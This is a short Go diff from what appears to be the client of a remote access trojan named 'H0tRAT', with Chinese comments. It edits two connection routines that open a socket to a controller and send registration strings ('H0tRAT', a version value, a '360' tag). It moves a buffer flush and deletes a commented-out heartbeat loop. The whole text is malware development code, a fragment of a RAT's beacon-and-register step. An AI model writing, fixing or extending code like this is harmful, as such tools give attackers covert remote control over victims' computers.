@@ -59,7 +59,6 @@ func connectNew() {
 	//defer socket.Close()
 	// IO流
 	dataOutputStream := bufio.NewWriter(socket)
-	dataOutputStream.Flush()
 
 	// 发送信息
 	fmt.Fprintln(dataOutputStream, "H0tRAT")
@@ -73,12 +72,8 @@ func connectNew() {
 	fmt.Fprintln(dataOutputStream, "测试")
 	fmt.Fprintln(dataOutputStream, VERSION)
 	fmt.Fprintln(dataOutputStream, "360")
-	//发送心跳防止掉线
-	//go heartbeat(socket, time.Second)
-	//
-	//for {
-	//	time.Sleep(time.Second)
-	//}
+
+	dataOutputStream.Flush()
 
 }
 
@@ -93,7 +88,6 @@ func maConnetNew() {
 
 	// IO流
 	dataOutputStream := bufio.NewWriter(socket)
-	defer dataOutputStream.Flush()
 
 	// 发送信息
 	fmt.Fprintln(dataOutputStream, "H0tRAT")
